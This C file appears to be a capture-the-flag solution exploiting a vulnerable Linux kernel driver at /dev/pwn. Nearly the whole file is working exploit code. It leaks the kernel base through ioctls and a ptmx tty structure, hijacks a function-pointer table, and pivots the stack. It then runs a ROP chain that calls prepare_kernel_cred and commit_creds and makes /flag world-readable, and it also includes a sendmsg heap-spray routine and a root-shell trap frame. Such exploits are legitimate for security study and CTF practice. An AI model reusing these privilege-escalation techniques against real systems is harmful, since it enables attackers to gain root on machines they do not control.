/*************************************************************************
	> File Name: solve.c
	> Author: cpegg
	> Mail: cpeggg@gmail.com
	> Created Time: Tue 30 Apr 2019 02:38:03 PM CST
 ************************************************************************/

#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <string.h>
#include <unistd.h>
#include <malloc.h>
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/mman.h>
#define debug 1
# define KERNCALL __attribute__ (( regparm (3) ))
struct trap_frame {
    void * rip ; // instruction pointer, set to target code addr
    unsigned long cs ; // code segment(0x23?)
    unsigned long rflags ; // CPU flags(0x396?)
    void * rsp ; // stack pointer
    unsigned long ss ; // stack segment
} __attribute__ (( packed  ));
struct inputstr{
    char* buf;
    int ctl;
} str;
typedef unsigned long time64_t;
struct timespec64 {
        time64_t tv_sec;/* seconds */
        long tv_nsec;/* nanoseconds */

};
int fd;
struct trap_frame tf;
void shell(){
    //execl("/bin/sh","sh",NULL);
    system("/bin/sh");
}
void preptf(){
    /*
    asm("moveq %%cs, tf+8;"
        "pushfq; popq tf+16;"
        "pushq %rsp;popq tf+24;"
        "moveq %%ss, tf+32;");
    */
    asm("movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "pushfq\n"
        "popq %2\n"
        "movq %%rsp, %3"
        : "=r" (tf.cs), "=r" (tf.ss), "=r" (tf.rflags) , "=r" (tf.rsp): : "memory"
    );
    //=> 0xffffffff81a01073:0xffffffff81a01073call   0xffffffff81a01210
    //
    tf.rip=&shell;
    tf.rsp-=0x400;

}
void output(char* buf){
#if debug
    for (int i=0;i<0x300/0x20;i++){
        printf("[0x%x]",i*32);
        for (int j=0;j<0x20;j++)
            printf("%02x ",((int)buf[i*32+j])&0xff);
        puts("");
    }
    puts("");
#endif
}
void error(char* name){
    perror(name);
    exit(-1);
}
void del(unsigned int a){
    char buf[16]={0};
    memcpy(buf+8,&a,4);
    ioctl(fd,0x6008,buf);
}
void func6(){
    char buf[40]={0};
    char buff[0x10]="Hello world!!!!";
    *(unsigned long*)&buf[0]=1;
    *(unsigned long*)&buf[8]=(unsigned long)buff;
    *(unsigned long*)&buf[16]=0x300;
    ioctl(fd,6,buf);
}
void func6666(){
    unsigned long buf=1;
    ioctl(fd,6666,&buf);
}
char bufffer[0x1000]={0};
void func666(){
    char buf[0x110]={0};
    *(unsigned long*)&buf[0]=1;
    *(unsigned long*)&buf[8]=(unsigned long)0;
    *(unsigned long*)&buf[16]=0x300;
    *(unsigned long*)&buf[0x108]=0;
    ioctl(fd,666,buf);
}
void func666x(){
    char buf[0x110]={0};
    *(unsigned long*)&buf[0]=1;
    *(unsigned long*)&buf[8]=(unsigned long)bufffer;
    *(unsigned long*)&buf[16]=0x300;
    *(unsigned long*)&buf[0x108]=0;
    ioctl(fd,666,buf);
}
void func66(){
    char buf[0x110]={0};
    *(unsigned long*)&buf[0]=1;
    *(unsigned long*)&buf[8]=(unsigned long)bufffer;
    *(unsigned long*)&buf[16]=0x300;
    *(unsigned long*)&buf[0x108]=0;
    ioctl(fd,66,buf);
}
#define BUFF_SIZE 0x48
void perpare_sendmsg(unsigned long tar, unsigned long exc){
    struct sockaddr_in addr = {0};
    struct msghdr msg = {0};
    char buff[BUFF_SIZE];
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    addr.sin_family = AF_INET;
    addr.sin_port = htons(6666);
    memset(buff,0x42,BUFF_SIZE);
    memcpy(&buff[56],&tar,8);
    memcpy(&buff[64],&exc,8);
    /* This is the data that will overwrite the vulnerable object 
    *     in the heap */
    msg.msg_control = buff;
    /* This is the user controlled size, 
    * eventually kmalloc(msg_controllen) will occur */
    msg.msg_controllen = BUFF_SIZE; 
    msg.msg_name = (caddr_t)&addr;
    msg.msg_namelen = sizeof(addr);
    for(int i = 0; i < 100000; i++) {
        sendmsg(sockfd, &msg, 0);
    }
}
/*
 * 0xffffffffc00044e0 execptrs
 */
typedef int __attribute__((regparm(3))) (*_commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);
_prepare_kernel_cred prepare_kernel_cred=0;
_commit_creds commit_creds =0;

void getRoot(){
    commit_creds(prepare_kernel_cred(0));
}
void info(char* buf){
    write(1,buf,strlen(buf));
    write(1,"\n",1);
}
int main(){
    int ptmxfd[10]={0};
    unsigned long fakestack;
    char* ops=(char*)mmap(0,0x1000,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0);
    fd=open("/dev/pwn",O_RDONLY);
    if (fd<0) {error("open");}
    preptf();
    func6();
    func666();
    for (int i=0;i<1;i++) 
        ptmxfd[i]=open("/dev/ptmx",O_RDWR|O_NOCTTY);
    func66();
    info("1");
    unsigned long linuxbase=0;
    //output(bufffer);
    memcpy(&linuxbase,&bufffer[0x2b0],8);
    info("2");
    linuxbase=linuxbase-0x6182b0-0xab0;
    //printf("linuxbase: 0x%lx\nops :0x%lx",(unsigned long)linuxbase,(unsigned long)ops);
    unsigned long xchgeaxesp=linuxbase+0x1ebb7;
    unsigned long swapgs=linuxbase+0x70894;
    unsigned long prdi=linuxbase+0x86800;
    unsigned long iret=linuxbase+0xBF9E5;
    commit_creds=(_commit_creds)linuxbase+0xb9a00;
    prepare_kernel_cred=(_prepare_kernel_cred)linuxbase+0xb9db0;
    unsigned long native_write_cr4=linuxbase+0x707f0;
    unsigned long ret=linuxbase+0xBFAF9;
    unsigned long movrdiraxjapop=linuxbase+0x4d746d;
    unsigned long printk=linuxbase+0xfa5c3;
    unsigned long filp_open=linuxbase+0x29fec0;
    unsigned long __x86_indirect_thunk_rax=linuxbase+0xe03000;
    unsigned long prsi=linuxbase+0x10e261;
    unsigned long prdx=linuxbase+0x18ad12;
    unsigned long prcx=linuxbase+0x1ebe93;
    unsigned long movrbprax=linuxbase+0x838b6;
    unsigned long movrdirbp=linuxbase+0x1a707a;
    unsigned long kernelread=linuxbase+0x2a3ad0;
    unsigned long poo7=linuxbase+0x1ccec;
    unsigned long kpti_ret=linuxbase+0xc0098a;
    unsigned long chmod=linuxbase+0x29f9c0;
    unsigned long sleep=linuxbase+0x11c300;
    info("3");
    char flagaddr[]="/flag";
    fakestack=(unsigned long)mmap((void*)((xchgeaxesp&0xffffffff)&~0xfff),0x30000,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0);
    /*
    unsigned long rop_chain[]={
        prdi,
        (unsigned long)flagaddr,
        prsi,
        native_write_cr4,
        //(unsigned long)getRoot,
        swapgs,
        fakestack,
        iret,
        (unsigned long)tf.rip,
        tf.cs,
        tf.rflags,
        (unsigned long)fakestack+0x100,
        tf.ss
    };
    */
    uint64_t args[2] = {0777, (uint64_t)"/flag"};
    char *fuck = (char*)args - 0x68;
    struct timespec64 long_time = {
          .tv_sec = 10000,
          .tv_nsec = 0,
    };
    unsigned long rop_chain[]={
        prdi,0,
        linuxbase+0xb9db0,
        linuxbase+0xb9a00,
        prdi,(unsigned long)fuck,chmod,
        prdi,(unsigned long)&long_time,
        prsi,1,prdx,1,sleep
        
    };
/*
        prdi,(unsigned long)flagaddr,
        prsi,0,prdx,0,filp_open,
        movrbprax,movrdirbp,
        prdx,128,prsi,(unsigned long)(xchgeaxesp&0xffffffff)+21*8,prcx,fakestack,kernelread,poo7,


    };*/
    info("4");
    memcpy((void*)(xchgeaxesp&0xffffffff),rop_chain,sizeof(rop_chain));
    info("5");
    memcpy(&bufffer[24],&ops,8);
    memcpy(&ops[12*8],&xchgeaxesp,8);
    //output(bufffer);
    func666x();
    info("6");
    for (int i=0;i<1;i++)
        ioctl(ptmxfd[i],1,NULL);
    //shell();
    write(1,"You should not go there",0x20);
}
